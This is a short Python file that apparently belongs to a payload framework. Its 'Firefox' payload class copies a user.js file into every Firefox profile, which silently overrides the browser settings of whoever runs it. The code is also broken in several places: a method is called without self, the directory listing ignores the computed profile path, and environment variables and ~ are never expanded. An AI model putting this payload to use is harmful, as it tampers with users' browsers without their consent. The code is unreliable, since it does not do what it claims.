import payload
import common
import os
import shutil

class Firefox(payload.Payload):
    name = "Firefox"
    os = ["All"]
    os_version = ["All"]

    def execute(self):
        add_user_js()

    def add_user_js(self):
        if "Windows" in payload.get_os():
            profile_dir = "%APPDATA%\\Roaming\\Mozilla\\Firefox\\profiles\\"
        elif "Linux" in payload.get_os():
            profile_dir = "~/.mozilla/firefox/"

        profiles = os.listdir()
        
        for profile in profiles:
            shutil.copy("user.js", profile + "/")
